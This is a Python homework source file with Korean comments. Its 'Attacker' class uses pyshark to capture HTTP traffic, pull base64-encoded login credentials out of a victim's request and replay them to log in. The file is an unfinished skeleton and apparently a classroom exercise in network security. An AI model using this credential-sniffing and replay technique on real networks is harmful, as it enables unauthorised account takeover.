import pyshark
import requests
import base64
from socket_connection_homework import socket_connect

""" 
pip install pyshark

=============================

1. User 가 login_url 에 로그인 by login.py
2. 로그인에는 user name 과 password 가 필요
	2-1. 이때, username:password 는 base64 로 encoding 되어 있다.
3. Attacker 는 user 가 로그인을 시도할 때, sniffing 을 통해 정보 가져오기
4. user 의 decoded username & password 와 HTTP protocol version, host name 을 출력
5. 동시에, Packet 에 담겨져 있는 username 과 password 를 이용해 login_url 에 로그인

=============================

최종적으로 필요한 것들, (code + image)

1. decoded user info
2. HTTP protocol version
3. Host name
4. response from login_url and log in success

=============================
* Packet 에 적혀있는 정보를 통해 작성하되, 
self.decoded_info 는 base64 를 사용하여 decoding 해야 하고, attacker 로 로그인할 때에는 socket_connection_homework.py 를 사용해야 합니다.
"""

class Attacker():
    
    def __init__(self):
        """ 필요한 내용 작성 """
        self.encoded_info = "" 
        self.decoded_info = "" # use base64
        self.http_version = ""
        self.login_url = ""
        self.host_name = ""
        
        self.protocol = 'http'
    
    """ interface, tshark_path 이외 수정 X"""
    """ Packet sniffing """
    def setting(self):
        self.http_packet_count = 0 
        """ interface는 자신의 환경에 맞게 작성, tshark_path도 자신의 환경에 맞게 작성 """
        # self.capture = pyshark.LiveCapture(
        #     interface='en0',
        #     bpf_filter='tcp port 80 or tcp port 443',
        # )
        self.capture = pyshark.LiveCapture(
            interface=r'\Device\NPF_{90895F2A-150B-4918-B1BB-39FCB239FCFB}',
            bpf_filter='tcp port 80 or tcp port 443',
            tshark_path=r'C:\Program Files\Wireshark\tshark.exe'
        )
        self.capture.apply_on_packets(self.packet_handler)
    
    """ HTTP packet 2 개만 출력 """
    def packet_handler(self, pkt):
        if self.protocol in pkt:

            print("\n",pkt.http)
            self.http_packet_count += 1
            
            if self.http_packet_count == 2:
                self.print_user_info()
                self.attack()
                self.protocol = 'exit'
    
    """ login_url 로 attacker 가 로그인 시도 """
    def attack(self):
        socket_connect()
            
    def print_user_info(self):
        print("="*20)
        print(f"Decoded user info: {self.decoded_info}")
        print(f"HTTP version: {self.http_version}")
        print(f"Host name: {self.host_name}")
        print("="*20)

            
if __name__ == '__main__':       

    attacker = Attacker()
   
    attacker.setting()
 
